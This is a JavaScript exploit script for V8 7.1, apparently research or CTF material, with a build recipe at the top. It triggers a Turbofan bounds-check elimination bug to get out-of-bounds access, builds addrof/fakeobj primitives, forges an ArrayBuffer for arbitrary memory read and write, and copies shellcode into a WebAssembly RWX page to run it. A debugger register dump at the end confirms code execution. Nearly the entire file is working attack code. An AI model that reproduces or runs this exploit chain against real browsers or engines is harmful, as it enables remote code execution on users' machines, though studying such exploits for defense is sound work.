/*
Commit: c2bec8045f7ad3ece1c5d80236183a21c1fac3f5
Branch Base Commit: 4226ddf99103e493d7afb23a4c7902ee496108b6
Branch Base Position: 599034
V8 Commit: b5a5d900a5385d6429edefb11ece72bfa649ca47
V8 Version: 7.1.302.31
V8 Position: 64
Skia Commit: 7469a9341afab19271b8ef07af5c16a0f2c4ccc1


mkdir v8 && cd v8 && fetch --nohooks v8
gclient sync --with_branch_heads  # Run anytime you change v8 version
cd v8 && ./build/install-build-deps.sh
git checkout b5a5d900a5385d6429edefb11ece72bfa649ca47
gclient sync --with_branch_heads

tools/dev/gm.py x64.debug
*/

/*
 * In this function we use the length of the arguments to calculate the number 1.
 * Turbofan things arguments are limited to a smaller number, so it will optimize
 * out the bounds checks based on our number, giving us oob read/write
 */

 // run With

// ./d8 --no-untrusted-code-mitigations ./exploit.js  --shell


load("/home/ubuntu/int64.js")
var a1, hax;
var a3, a4;
function opt(arg) {
    let x = arguments.length;
    a1 = new Array(0x10);
    hax = new Array(0x10);
    hax[0] = 1.1; 
    hax[1] = 1.1;
    a3 = new Array(0x10);
    a3[0] = 1.2;
    a3[1] = 1.2;
    a4 = new Array(0x10);
    a4[0] = {};
    a4[1] = {};

    a1[(x >> 16) * 0x29] = 5.43230922487e-312; //0x00000100'00000000
}


let small = [1.1];
let large = [1.1,1.1];
large.length = 65536;
large.fill(1.1);

for (let j = 0; j< 100000; j++) {
    opt.apply(null, small);
}

opt.apply(null, large);

var map_dbl = hax[0x10]; // map from a3
var map_obj = hax[60]; // map from a4

function addrof(obj) {
    a4[0] = obj;
    hax[60] = map_dbl;
    r = Int64.from_double(a4[0]);
    hax[60] = map_obj;
    return r;
}

function fakeobj(addr) {
    hax[60] = map_dbl;
    a4[0] = addr.to_double();
    hax[60] = map_obj;
    return a4[0];
}

target_array_buffer = new ArrayBuffer(0x200);

/*
ArrayBuffer MAP values:
0x2baa08984460:	0x00000bd8f2d02251	0x1900042313080808
0x2baa08984470:	0x00000000082003ff	0x0000187c8e0114f9
0x2baa08984480:	0x0000187c8e011359	0x0000000000000000
0x2baa08984490:	0x00000bd8f2d02321	0x0000000000000000
0x2baa089844a0:	0x00000bd8f2d02391	0x000027ba6a102201
*/

let fake_map = {
	a: 0x3132, // Map root
	b: new Int64('0x1900042313080808').to_double(), // flags
	c: new Int64('0x00000000082003ff').to_double(), // flags 2
	d: 0x4142, // prototype
	e: 0x5152, // constructor_or_backpointer 
	f: 0x6162, // raw_transitions 
	g: 0,      // instance_descriptors
	h: 0x8182, // layout_descriptors
	i: 0x9192, // dependent_code
};

let array_buffer_map = addrof(fake_map).add(0x18);

let holder = {
   map: array_buffer_map.to_double(),
   properties: 0,
   elements: 0, // requires valid elements ptr
   bytes_length: (new Int64(0x100)).to_double(),
   backing_store: addrof(target_array_buffer).sub(1).to_double(),
   bitfield: (new Int64(2)).to_double(),
   embedder_field: (new Int64(0).to_double())
}

let addr = addrof(holder).add(0x18);
let fake_array_buffer = fakeobj(addr);
// The buffer is accessed through a view!
fake_view = new Float64Array(fake_array_buffer);

function read64(addr) {
    dbl = addr.to_double();
    fake_view[4] = dbl;
    accessor = new Float64Array(target_array_buffer);
    return Int64.from_double(accessor[0]);
}

function write64(addr, value) {
    dbl = addr.to_double();
    fake_view[4] = dbl;
    accessor = new Float64Array(target_array_buffer);
    accessor[0] = value.to_double();
}

function cleanup() {
    print("Cleanup")
    delete a3;
    delete a4;
    delete a1;
    delete hax;
}

function wasm_jit_method() {
    // Generate WASM JIT RWX Page
    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;

    // GET FunctionAddress
    var rwx_page_addr = read64(addrof(wasm_instance).sub(1).add(0xf0));
    console.log("WASM Page: " + rwx_page_addr);

    var shellcode=[0xCCCCCCCC,0x90909090];

    // Copy Shellcode to address
    dbl = rwx_page_addr.to_double();
    fake_view[4] = dbl;
    accessor = new Uint32Array(target_array_buffer);
    for (let i = 0; i < shellcode.length; i++) {
        accessor[i] = shellcode[i];
    }

    cleanup();

    f();
}


wasm_jit_method();

/*
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────
 RAX  0x1cedc8740000 ◂— int3    // 0x90909090cccccccc 
 RBX  0x1cedc8740000 ◂— int3    // 0x90909090cccccccc 
 RCX  0x2f03b1b42620 ◂— push   rbp
 RDX  0x17693b1025a1 ◂— 0x17693b1025
 RDI  0x2092ba72ade1 ◂— 0xf100002efdcda063
 RSI  0x2092ba72ac29 ◂— 0xf100002efdcda0b1
 R8   0x55555675a970 —▸ 0x2092ba71da51 ◂— 0x6100002efdcda0a0
 R9   0x13a
 R10  0x5555566e5199 ◂— 0x100000000
 R11  0x5c
 R12  0xffffffffffffffff
 R13  0x5555566e9728 —▸ 0x17693b1029c1 ◂— 0x17693b1022
 R14  0x2092ba72a689 ◂— 0x17693b1034
 R15  0x55555672b170 —▸ 0x5555564992e0 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7]
 RBP  0x7fffffffd968 —▸ 0x7fffffffda00 —▸ 0x7fffffffda90 —▸ 0x7fffffffdab8 —▸ 0x7fffffffdb20 ◂— ...
 RSP  0x7fffffffd950 —▸ 0x2f03b1b42654 ◂— mov    rbx, qword ptr [rip - 0x27]
 RIP  0x1cedc8740001 ◂— int3    // 0x90909090cccccc 
*/